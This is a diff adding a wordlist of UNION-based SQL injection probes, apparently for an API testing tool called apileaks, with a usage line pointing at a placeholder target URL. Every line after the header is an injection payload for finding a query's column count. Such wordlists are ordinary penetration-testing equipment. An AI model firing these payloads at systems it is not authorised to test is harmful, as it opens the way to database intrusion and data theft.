@@ -1,0 +1,19 @@
+# SQL Injection Payloads — UNION-based probes
+# Usage:
+#   apileaks req GET "http://target/api?id=1" \
+#     --plugin sqlinjection --parameters id \
+#     --payload-file wordlists/sqli-union.txt
+
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL--
+' UNION SELECT 1--
+' UNION SELECT 1,2--
+' UNION SELECT 1,2,3--
+' UNION SELECT 1,2,3,4--
+' UNION ALL SELECT NULL--
+' UNION ALL SELECT NULL,NULL--
+' UNION ALL SELECT NULL,NULL,NULL--
+1 UNION SELECT NULL--
+1 UNION SELECT NULL,NULL--
